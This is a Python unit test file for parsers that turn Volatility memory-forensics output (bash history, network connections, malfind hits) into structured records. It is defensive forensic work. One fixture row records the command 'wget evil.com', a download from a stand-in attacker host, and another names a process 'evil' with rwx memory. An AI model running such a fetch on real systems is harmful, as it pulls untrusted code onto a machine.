"""Unit tests for Volatility artifact parsers."""
from chimera.parsers.volatility_artifacts import (
    BashHistoryEntry, MalfindHit, NetworkConnection,
    parse_bash, parse_malfind, parse_netstat,
)


def test_parse_bash_basic():
    rows = [
        {"PID": 1234, "Process": "bash", "Command": "ls -la"},
        {"PID": 1234, "Process": "bash", "Command": "wget evil.com"},
    ]
    out = parse_bash(rows)
    assert len(out) == 2
    assert out[0].command == "ls -la"
    assert out[1].command == "wget evil.com"


def test_parse_bash_skips_empty_commands():
    rows = [{"PID": 1, "Process": "bash"}, {"Command": "real"}]
    out = parse_bash(rows)
    assert len(out) == 1
    assert out[0].command == "real"


def test_parse_netstat_extracts_endpoints():
    rows = [
        {
            "Family": "AF_INET", "Protocol": "TCP", "State": "ESTABLISHED",
            "Source": "10.0.0.1", "Source Port": 5555,
            "Destination": "1.2.3.4", "Destination Port": 80,
            "PID": 100, "Process": "wget",
        },
    ]
    out = parse_netstat(rows)
    assert len(out) == 1
    nc = out[0]
    assert nc.family == "AF_INET"
    assert nc.protocol == "TCP"
    assert nc.state == "ESTABLISHED"
    assert nc.local_port == 5555
    assert nc.remote_addr == "1.2.3.4"
    assert nc.pid == 100


def test_parse_netstat_handles_alternate_keys():
    rows = [{"Proto": "udp", "LocalAddr": "0.0.0.0", "LPort": 53,
             "RemoteAddr": "*", "RPort": 0}]
    out = parse_netstat(rows)
    assert len(out) == 1
    assert out[0].protocol == "udp"
    assert out[0].local_port == 53


def test_parse_malfind_basic():
    rows = [
        {"PID": 999, "Process": "evil", "Start": "0x7f1234", "End": "0x7f5678",
         "Protection": "rwx", "Disasm": "mov rax, 0xdeadbeef"},
    ]
    out = parse_malfind(rows)
    assert len(out) == 1
    assert out[0].pid == 999
    assert out[0].protection == "rwx"
    assert out[0].has_disasm is True


def test_parse_malfind_handles_missing_disasm():
    rows = [{"PID": 1, "Process": "x", "Start": "0x0", "End": "0x100",
             "Protection": "rw-"}]
    out = parse_malfind(rows)
    assert out[0].has_disasm is False


def test_to_dict_serialization():
    bash = BashHistoryEntry(pid=1, process="bash", command="ls")
    nc = NetworkConnection(family="AF_INET", protocol="TCP", state="ESTABLISHED",
                           local_addr="1.1.1.1", local_port=22,
                           remote_addr="2.2.2.2", remote_port=80,
                           pid=1, process="ssh")
    mf = MalfindHit(pid=2, process="x", start_addr="0x1", end_addr="0x2",
                   protection="rwx", has_disasm=True)
    assert bash.to_dict()["command"] == "ls"
    assert "1.1.1.1:22" in nc.to_dict()["local"]
    assert mf.to_dict()["protection"] == "rwx"


def test_empty_inputs():
    assert parse_bash([]) == []
    assert parse_bash(None) == []
    assert parse_netstat([]) == []
    assert parse_netstat(None) == []
    assert parse_malfind([]) == []
    assert parse_malfind(None) == []
